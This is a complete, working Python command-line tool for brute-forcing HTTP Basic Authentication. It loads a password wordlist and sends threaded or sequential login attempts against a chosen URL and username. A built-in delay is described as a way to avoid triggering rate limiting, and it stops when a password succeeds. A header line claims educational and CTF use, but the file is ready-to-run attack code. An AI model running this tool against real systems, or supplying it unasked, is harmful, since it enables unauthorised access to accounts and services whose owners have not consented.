#!/usr/bin/env python3
"""
HTTP Basic Authentication Brute Force Tool
For educational and CTF purposes only
"""

import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
import time
from urllib.parse import urlparse


class HTTPAuthBruteForce:
    def __init__(self, url, username, password_file, threads=5, timeout=10, delay=0):
        self.url = url
        self.username = username
        self.password_file = password_file
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.found = False
        self.valid_password = None

    def load_passwords(self):
        """Load passwords from file"""
        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(passwords)} passwords from {self.password_file}")
            # Show first and last few passwords for verification
            if passwords:
                sample_size = min(3, len(passwords))
                print(f"[*] Sample passwords (first {sample_size}): {passwords[:sample_size]}")
                if len(passwords) > sample_size * 2:
                    print(f"[*] Sample passwords (last {sample_size}): {passwords[-sample_size:]}")
            return passwords
        except FileNotFoundError:
            print(f"[-] Password file not found: {self.password_file}")
            sys.exit(1)

    def try_password(self, password):
        """Try a single password"""
        if self.found:
            return None

        # Add delay if specified (to avoid triggering rate limiting)
        if self.delay > 0:
            time.sleep(self.delay)

        try:
            response = requests.get(
                self.url,
                auth=HTTPBasicAuth(self.username, password),
                timeout=self.timeout,
                allow_redirects=False
            )

            # Status 200 means authentication successful
            # Status 401 means authentication failed
            # Status 403 means forbidden (might be rate limiting)
            if response.status_code == 200:
                return password
            elif response.status_code == 401:
                return None
            elif response.status_code == 403:
                print(f"[*] Got 403 Forbidden with password '{password}' - possible rate limiting")
                return None
            else:
                print(f"[*] Unexpected status {response.status_code} with password '{password}'")
                return None

        except requests.exceptions.Timeout:
            print(f"[*] Timeout with password '{password}'")
            return None
        except requests.exceptions.RequestException as e:
            print(f"[*] Request error with password '{password}': {e}")
            return None
        except Exception as e:
            print(f"[!] Unexpected error with password '{password}': {type(e).__name__}: {e}")
            return None

    def brute_force(self):
        """Execute brute force attack"""
        passwords = self.load_passwords()
        total = len(passwords)

        print(f"[*] Starting HTTP Basic Auth brute force")
        print(f"[*] Target: {self.url}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Passwords to try: {total}")
        print(f"[*] Threads: {self.threads}")
        print("=" * 60)

        tried = 0

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.try_password, pwd): pwd for pwd in passwords}
            print(f"[*] Submitted {len(futures)} tasks to thread pool")

            for future in as_completed(futures):
                tried += 1
                password = futures[future]
                    

                # Progress indicator
                if tried % 10 == 0:
                    print(f"[*] Progress: {tried}/{total} passwords tried")

                try:
                    result = future.result()
                    if result:
                        print(f"\n[+] PASSWORD FOUND: {result}")
                        # Cancel remaining futures
                        print(f"[*] Password found! Cancelling {len(futures) - tried} remaining tasks...")
                        for f in futures:
                            f.cancel()
                        return result
                except Exception as e:
                    print(f"[!] Future error with password '{password}': {type(e).__name__}: {e}")

        print("\n" + "=" * 60)
        print(f"[*] Final statistics: {tried}/{total} passwords attempted")
        print("[-] Password not found in list")
        return None

    def brute_force_sequential(self):
        """Sequential brute force (slower but simpler)"""
        passwords = self.load_passwords()
        total = len(passwords)

        print(f"[*] Starting sequential brute force")
        print(f"[*] Target: {self.url}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Passwords to try: {total}")
        print("=" * 60)

        for i, password in enumerate(passwords, 1):
            print(f"[*] Trying [{i}/{total}]: {password}", end='\r')

            result = self.try_password(password)
            if result:
                print(f"\n[+] PASSWORD FOUND: {result}")
                return result

        print("\n[-] Password not found in list")
        return None


def main():
    parser = argparse.ArgumentParser(
        description='HTTP Basic Authentication Brute Force Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://example.com/admin -n admin -p passwords.txt
  %(prog)s -u http://target.com/protected -n user -p passwords.txt -t 10
  %(prog)s -u http://target.com/protected -n admin -p passwords.txt --sequential
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-n', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password-file', required=True, help='Password list file')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--sequential', action='store_true', help='Use sequential mode (no threading)')
    parser.add_argument('--verify', type=str, help='Verify a specific password')

    args = parser.parse_args()

    # Validate URL
    try:
        result = urlparse(args.url)
        if not all([result.scheme, result.netloc]):
            print("[-] Invalid URL format")
            sys.exit(1)
    except Exception:
        print("[-] Invalid URL format")
        sys.exit(1)

    brute = HTTPAuthBruteForce(
        url=args.url,
        username=args.username,
        password_file=args.password_file,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay
    )

    # Verify mode
    if args.verify:
        print(f"[*] Verifying password: {args.verify}")
        result = brute.try_password(args.verify)
        if result:
            print(f"[+] Password '{args.verify}' is VALID!")
        else:
            print(f"[-] Password '{args.verify}' is INVALID")
        return

    # Brute force mode
    if args.sequential:
        brute.brute_force_sequential()
    else:
        brute.brute_force()


if __name__ == "__main__":
    main()
